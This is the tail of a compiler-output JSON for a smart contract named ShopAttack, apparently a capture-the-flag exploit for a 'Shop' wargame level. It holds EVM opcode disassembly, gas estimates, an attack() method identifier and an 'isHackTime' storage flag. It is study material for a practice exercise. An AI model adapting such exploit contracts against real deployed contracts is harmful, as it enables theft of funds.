PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x14B JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x15F JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x183 SWAP2 SWAP1 PUSH2 0x2D9 JUMP JUMPDEST EQ PUSH2 0x1C3 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x1BA SWAP1 PUSH2 0x338 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST JUMP JUMPDEST PUSH1 0x0 PUSH1 0x1 ISZERO ISZERO PUSH32 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xE852E741 PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x231 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x245 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x269 SWAP2 SWAP1 PUSH2 0x2AC JUMP JUMPDEST ISZERO ISZERO EQ ISZERO PUSH2 0x27A JUMPI PUSH1 0x1 SWAP1 POP PUSH2 0x27F JUMP JUMPDEST PUSH1 0x64 SWAP1 POP JUMPDEST SWAP1 JUMP JUMPDEST PUSH1 0x0 DUP2 MLOAD SWAP1 POP PUSH2 0x291 DUP2 PUSH2 0x3C8 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 MLOAD SWAP1 POP PUSH2 0x2A6 DUP2 PUSH2 0x3DF JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x2C2 JUMPI PUSH2 0x2C1 PUSH2 0x39A JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH2 0x2D0 DUP5 DUP3 DUP6 ADD PUSH2 0x282 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x2EF JUMPI PUSH2 0x2EE PUSH2 0x39A JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH2 0x2FD DUP5 DUP3 DUP6 ADD PUSH2 0x297 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x313 PUSH1 0x4 DUP4 PUSH2 0x373 JUMP JUMPDEST SWAP2 POP PUSH2 0x31E DUP3 PUSH2 0x39F JUMP JUMPDEST PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x332 DUP2 PUSH2 0x390 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH1 0x0 DUP4 ADD MSTORE PUSH2 0x351 DUP2 PUSH2 0x306 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x36D PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x329 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP3 DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 ISZERO ISZERO SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH32 0x6661696C00000000000000000000000000000000000000000000000000000000 PUSH1 0x0 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH2 0x3D1 DUP2 PUSH2 0x384 JUMP JUMPDEST DUP2 EQ PUSH2 0x3DC JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH2 0x3E8 DUP2 PUSH2 0x390 JUMP JUMPDEST DUP2 EQ PUSH2 0x3F3 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 PUSH32 0xFE50C6680D96CC2F84CCA6421BD4B09D3FCB0EEC24CDC70830788E4BFEF7BC64 PUSH20 0x6F6C634300080700330000000000000000000000 "
				},
				"gasEstimates": {
					"creation": {
						"codeDepositCost": "213600",
						"executionCost": "infinite",
						"totalCost": "infinite"
					},
					"external": {
						"attack()": "infinite",
						"price()": "infinite"
					}
				},
				"methodIdentifiers": {
					"attack()": "9e5faafc",
					"price()": "a035b1fe"
				}
			},
			"storageLayout": {
				"storage": [
					{
						"astId": 53,
						"contract": "contracts/21_shop.sol:ShopAttack",
						"label": "isHackTime",
						"offset": 0,
						"slot": "0",
						"type": "t_bool"
					}
				],
				"types": {
					"t_bool": {
						"encoding": "inplace",
						"label": "bool",
						"numberOfBytes": "1"
					}
				}
			},
			"userdoc": {
				"kind": "user",
				"methods": {},
				"version": 1
			}
		}
	}
}